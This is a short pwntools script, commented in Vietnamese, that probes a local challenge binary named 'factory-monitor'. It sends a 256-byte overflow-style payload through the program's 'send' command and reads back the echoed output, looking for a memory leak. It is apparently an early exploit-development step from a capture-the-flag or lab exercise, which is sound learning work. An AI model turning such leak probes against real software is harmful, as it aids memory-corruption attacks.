from pwn import *

p = process('./factory-monitor')

# Khởi tạo machine
p.sendlineafter(b"factory> ", b"create test")
p.sendlineafter(b"factory> ", b"start 0")

# Lần 1: Gọi recv để "vét" dòng ready ban đầu
p.sendlineafter(b"factory> ", b"recv 0 1000")
print("--- LẦN 1 (Ready) ---")
print(p.recvline())

# Gửi 256 chữ A. Chú ý sendlineafter sẽ tự động thêm \n thành 257 byte.
payload = b"send 0 " + b"A" * 256
p.sendlineafter(b"factory> ", payload)

# Lần 2: Gọi recv để đọc dòng prefix "echo[test]:"
p.sendlineafter(b"factory> ", b"recv 0 1000")
print("--- LẦN 2 (Prefix) ---")
print(p.recvline())

# Lần 3: ĐỌC DỮ LIỆU DỘI NGƯỢC (ĐÂY LÀ LÚC TÌM LEAK)
p.sendlineafter(b"factory> ", b"recv 0 1000")
print("--- LẦN 3 (Dữ liệu thực tế) ---")
print(p.recvline())

# Vét sạch mọi thứ còn sót lại trong buffer (nếu có)
print("--- CÒN LẠI ---")
print(p.clean(timeout=1))